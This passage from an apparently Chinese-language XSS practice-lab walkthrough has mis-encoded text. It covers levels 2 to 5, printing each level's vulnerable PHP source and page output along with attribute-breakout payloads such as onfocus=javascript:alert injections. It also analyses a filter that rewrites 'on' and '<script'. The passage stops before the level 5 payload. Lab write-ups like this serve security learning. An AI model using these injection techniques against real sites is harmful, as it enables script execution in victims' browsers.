class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level2.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>åˆ†æä¸€ä¸‹æºç ï¼Œå…ˆæ˜¯æœ‰htmlspcialcharæ¥è¿›è¡Œè½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ï¼Œä½†æ˜¯åœ¨ä¸‹é¢çš„.$str.æ²¡æœ‰ï¼Œæ‰€ä»¥ä¹Ÿä¸éœ€è¦è€ƒè™‘ç»•è¿‡<br>å¦‚æœæ’å…¥ï¼š  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
<p>ä¼šå˜æˆï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;input name=keyword  value=<span class="hljs-string">&quot;&#x27;&quot;</span>&gt;&lt;script&gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)&lt;/script&gt;<span class="hljs-string">&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œæ˜¯å…ˆé—­åˆäº†åŒå¼•å·ï¼Œå†é—­åˆäº†inputçš„å°–æ‹¬å·ï¼Œæœ€åçš„scriptå°±å˜æˆäº†æ–°å…ƒç´ æ‰§è¡Œäº†  </p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>å…ˆå°è¯•ï¼š  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">aler</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>æŸ¥çœ‹è¿”å›é¡µé¢åŸç ï¼š  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level4.php?keyword=try harder!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level3<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level3<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ²¡æœ‰æ‰¾åˆ°å’Œ<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(<span class="hljs-symbol">&amp;quot;</span>1<span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>ç›¸å…³çš„ç»“æœ.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level3.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(<span class="hljs-symbol">&amp;quot;</span>1<span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>&#x27;</span>&gt;</span>	<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">æœç´¢</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level3.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payloadçš„é•¿åº¦:27<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>å…¨éƒ½è¿›è¡Œäº†è½¬ä¹‰ï¼Œ<br>å­¦ä¹ äº†ç½‘ä¸Šçš„ onfocusäº‹ä»¶ç»•è¿‡<br>åœ¨ä¸éœ€è¦&lt;&gt;çš„æƒ…å†µä¸‹å®Œæˆç»•è¿‡ï¼Œå¤§æ¦‚å°±æ˜¯åœ¨ç”¨æˆ·è§¦å‘onfocusæ—¶ä¼šè°ƒç”¨ onfocus&#x3D;â€myFuncuntion()â€ é‡Œçš„myFuncuntion,ä½†æ˜¯é¢å¯¹æœªçŸ¥æºç çš„ç½‘ç«™æˆ‘ä»¬ä¸çŸ¥é“æœ‰ä»€ä¹ˆç¡®åˆ‡çš„å‡½æ•°<br>æ‰€ä»¥ä½¿ç”¨JavaScriptä¼ªåè®®è¿›è¡Œç»•è¿‡ï¼Œ<br>JavaScript åè®®ï¼ˆjavascript:ï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šçš„ URL åè®®ï¼Œç”¨äºåœ¨æµè§ˆå™¨ä¸­ç›´æ¥æ‰§è¡Œ JavaScript ä»£ç    </p>
<p>ç¤ºä¾‹ç”¨æ³•ï¼š  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Hello, World!&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥æ„é€ payload:  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&#x27; onfocus=javascript:alert(&#x27;</span><span class="hljs-variable constant_">XSS</span><span class="hljs-string">&#x27;) &#x27;</span><br><br>è¿™æ—¶å€™ï¼š  <br><br>&lt;input name=keyword  value=<span class="hljs-string">&#x27;114514&#x27;</span>&gt;<br><br>ä¼šå˜æˆï¼š  <br><br>&lt;input name=keyword  value=<span class="hljs-string">&#x27;finish&#x27;</span> onfocus=<span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>) <span class="hljs-string">&#x27;&#x27;</span>&gt;<br><br>è¿™æ—¶å€™ç‚¹å‡»è¾“å…¥æ¡†è§¦å‘onfocuså°±èƒ½æ‰§è¡Œ<br></code></pre></td></tr></table></figure>

<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹é¡µé¢æºç ï¼š  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level5.php?keyword=find a way out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level4<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level4<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ²¡æœ‰æ‰¾åˆ°å’Œ114514ç›¸å…³çš„ç»“æœ.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level4.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;114514&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">æœç´¢</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level4.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payloadçš„é•¿åº¦:6<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>æ³¨æ„åˆ°ä¸level 3 åªæ˜¯ å•å¼•å· å˜æˆäº† åŒå¼•å·   </p>
<p>é‚æ„é€ ï¼š  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&quot; onfocus=javascript:alert(&#x27;XSS&#x27;) &quot;</span><br></code></pre></td></tr></table></figure>
<p>å®ŒæˆæŒ‘æˆ˜  </p>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>å…ˆçœ‹ä¸€ä¸‹å‰ç«¯ï¼š  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level5<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ²¡æœ‰æ‰¾åˆ°å’Œfind a way out!ç›¸å…³çš„ç»“æœ.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;find a way out!&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">æœç´¢</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payloadçš„é•¿åº¦:15<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>æ€ä¹ˆæ„Ÿè§‰ï¼Œå’Œä¸Šä¸€å…³ä¸€æ ·å•Šï¼Ÿ<br>ä½†æ˜¯ï¼š  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level5<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ²¡æœ‰æ‰¾åˆ°å’Œfinish<span class="hljs-symbol">&amp;quot;</span> onfocus=javascript:alert(&#x27;xss&#x27;) <span class="hljs-symbol">&amp;quot;</span>ç›¸å…³çš„ç»“æœ.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;finish&quot;</span> <span class="hljs-attr">o_nfocus</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;) &quot;&quot;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">æœç´¢</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payloadçš„é•¿åº¦:42<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
<p>onfocus é‡Œ on å˜æˆ o_n äº†ã€‚<br>onfocus<br>å»dockeré‡Œçœ‹äº†ä¸€çœ¼æºç ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level5&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level5&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str3</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>ä¾æ—§æ²¡æœ‰è½¬ä¹‰inputé‡Œçš„strï¼Œé‚£å°è¯•æ„é€ ï¼š  </p>
